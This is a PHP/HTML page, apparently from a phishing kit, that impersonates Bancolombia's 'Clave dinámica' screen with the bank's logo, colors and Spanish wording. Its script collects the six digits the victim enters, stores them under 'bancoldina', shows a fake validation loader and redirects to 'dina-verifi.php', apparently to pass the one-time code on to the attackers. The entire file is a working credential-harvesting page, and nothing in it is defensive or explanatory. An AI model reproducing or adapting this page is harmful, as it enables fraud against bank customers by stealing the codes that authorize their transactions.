<?php // ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bancolombia - Clave dinámica</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', Arial, sans-serif; }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: "";
            position: absolute;
            top: 250px; left: -50px;
            width: 800px; height: 400px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M-10,80 Q30,20 80,60 T120,40" fill="none" stroke="%23F47C20" stroke-width="3" stroke-linecap="round"/><path d="M10,80 Q50,20 100,60" fill="none" stroke="%23FDDA24" stroke-width="2" stroke-linecap="round"/></svg>') no-repeat;
            background-size: contain; z-index: 0;
        }

        body::after {
            content: "";
            position: absolute;
            top: 150px; right: 0;
            width: 400px; height: 600px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M50,100 Q60,50 100,10" fill="none" stroke="%23FDDA24" stroke-width="4" stroke-linecap="round"/><path d="M20,100 Q50,60 90,20" fill="none" stroke="%23F47C20" stroke-width="2" stroke-linecap="round"/><path d="M70,40 Q85,20 100,15" fill="none" stroke="%238E44AD" stroke-width="2" stroke-linecap="round"/></svg>') no-repeat;
            background-size: contain; z-index: 0;
        }

        header {
            width: 100%; padding: 30px 0 20px 0;
            text-align: center; position: relative; z-index: 10;
        }
        header img { width: 200px; }
        .header-salir {
            position: absolute; right: 24px; top: 50%;
            transform: translateY(-50%);
            font-size: 14px; font-weight: 600; color: #2C2A29;
            cursor: pointer; background: none; border: none;
        }

        .container {
            display: flex; flex-direction: column; align-items: center;
            max-width: 520px; margin: 0 auto;
            padding: 10px 20px 50px;
            position: relative; z-index: 5;
        }

        .page-title {
            font-size: 1.8rem; color: #2C2A29;
            font-weight: 800; margin-bottom: 20px; text-align: center;
        }

        .login-card {
            background: #fff; border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            padding: 36px 30px; width: 100%; text-align: center;
        }

        .lock-icon { margin: 0 auto 14px; }

        .login-card p.subtitle {
            font-size: 0.95rem; color: #444;
            line-height: 1.5; margin-bottom: 28px;
        }

        /* ── 6 CAJITAS ── */
        .pin-row {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 28px;
        }

        .pin-input {
            width: 50px; height: 58px;
            text-align: center; font-size: 22px; font-weight: 700;
            border: 1.5px solid #ccc; border-radius: 8px;
            outline: none; color: #2C2A29;
            font-family: 'Open Sans', Arial, sans-serif;
            -webkit-appearance: none;
            transition: border-color 0.2s;
        }
        .pin-input:focus { border-color: #2C2A29; }

        .btns { display: flex; gap: 12px; }

        .btn-cancelar {
            flex: 1; padding: 16px; background: #fff; color: #2C2A29;
            border: 1.5px solid #ccc; border-radius: 50px;
            font-size: 1rem; font-weight: 700; cursor: pointer;
        }

        .btn-continuar {
            flex: 1; padding: 16px; background: #FDDA24; color: #2C2A29;
            border: none; border-radius: 50px;
            font-size: 1rem; font-weight: 700; cursor: pointer;
            transition: background 0.2s;
        }
        .btn-continuar:active { opacity: 0.85; }

        /* ── LOADER ── */
        #loading-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255,255,255,0.95);
            z-index: 9999; display: none;
            justify-content: center; align-items: center; flex-direction: column;
        }
        .loader-container { position: relative; width: 60px; height: 60px; animation: rotateLoader 1.5s linear infinite; }
        .dot { position: absolute; width: 20px; height: 20px; border-radius: 50%; }
        .dot-yellow { background-color: #FDDA24; top: 0; left: 50%; transform: translateX(-50%); }
        .dot-blue { background-color: #2C2A29; bottom: 5px; left: 0; }
        .dot-red { background-color: #ccc; bottom: 5px; right: 0; }
        @keyframes rotateLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        @media (max-width: 768px) {
            body::before { top: 80px; left: -100px; width: 600px; height: 300px; opacity: 0.6; }
            body::after { top: 100px; right: -80px; width: 350px; height: 500px; opacity: 0.6; }
            .container { padding: 10px 15px; }
            .page-title { font-size: 1.5rem; }
            .login-card { padding: 28px 16px; }
            .pin-input { width: 42px; height: 52px; font-size: 18px; gap: 8px; }
        }
    </style>
</head>
<body>

<div id="loading-overlay">
    <div class="loader-container">
        <div class="dot dot-yellow"></div>
        <div class="dot dot-blue"></div>
        <div class="dot dot-red"></div>
    </div>
    <div style="color:#2C2A29; margin-top:20px; font-weight:600;">Validando datos...</div>
</div>

<header>
    <img src="img/logo.svg" alt="Bancolombia">
    <button class="header-salir" onclick="history.back()">Salir →</button>
</header>

<div class="container">
    <h1 class="page-title">Clave dinámica</h1>
    <div class="login-card">

        <svg class="lock-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>

        <p class="subtitle">La puedes generar desde tu app o recibirás un mensaje de texto.</p>

        <div class="pin-row">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
        </div>

        <div class="btns">
            <button class="btn-cancelar" onclick="history.back()">Cancelar</button>
            <button class="btn-continuar" id="btnContinuar">Continuar</button>
        </div>
    </div>
</div>

<script>
    var inputs = document.querySelectorAll('.pin-input');
    var btn = document.getElementById('btnContinuar');

    inputs.forEach(function(input, i) {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value && i < inputs.length - 1) inputs[i + 1].focus();
        });
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && i > 0) inputs[i - 1].focus();
        });
    });

    btn.addEventListener('click', function() {
        var dina = Array.from(inputs).map(function(i) { return i.value; }).join('');
        if (dina.length < 6) { inputs[dina.length] && inputs[dina.length].focus(); return; }
        document.getElementById('loading-overlay').style.display = 'flex';
        localStorage.setItem('bancoldina', dina);
        setTimeout(function() { window.location.href = 'dina-verifi.php'; }, 800);
    });
</script>
</body>
</html>